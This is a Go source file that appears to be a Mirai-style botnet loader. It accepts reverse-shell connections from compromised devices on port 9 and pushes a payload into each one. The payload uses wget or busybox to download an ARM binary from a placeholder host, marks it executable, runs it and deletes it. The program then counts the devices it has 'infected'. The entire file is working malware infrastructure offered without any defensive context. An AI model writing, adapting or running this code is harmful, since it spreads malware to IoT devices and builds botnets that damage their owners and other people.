package main

import (
	"fmt"
	"net"
	"strings"
	"time"
)

var payload string = `
cd /mnt; cd /var; cd /etc; cd /tmp;
wget http://0.0.0.0/bins/arm7; chmod 777 arm7; ./arm7 arm7; rm -rf arm7;
/bin/busybox wget http://0.0.0.0/bins/arm7; chmod 777 arm7; ./arm7 arm7; rm -rf arm7;
busybox wget http://0.0.0.0/bins/arm7; chmod 777 arm7; ./arm7 arm7; rm -rf arm7;
`

var dirChange, statusAttempted, statusInfected, echoDropped, statusFailed, DlRead, Err int
var i int = 0

func zeroByte(a []byte) {
	for i := range a {
		a[i] = 0
	}
}

func loaderThread(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 512)
	conn.SetWriteDeadline(time.Now().Add(60 * time.Second))

	conn.Write([]byte(payload))

	statusAttempted++
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))

	for {
		le, err := conn.Read(buf)
		if err != nil || le <= 0 {
			break
		}

		if strings.Contains(string(buf), "here we are") {
			statusInfected++
			break
		}
	}
	zeroByte(buf)
	return
}

func main() {

	li, err := net.Listen("tcp", "0.0.0.0:9")
	if err != nil {
		return
	}

	var i int = 0
	go func() {
		for {
			fmt.Printf("[rev_shell] - Connections Recvd: %d | Succ Infected: %d\r\n", statusAttempted, statusInfected)
			time.Sleep(1 * time.Second)
			i++
		}
	}()

	go func() {
		for {
			conn, err := li.Accept()
			if err != nil {
				break
			}

			go loaderThread(conn)
		}
	}()

	for {
		time.Sleep(1 * time.Second)
	}
}
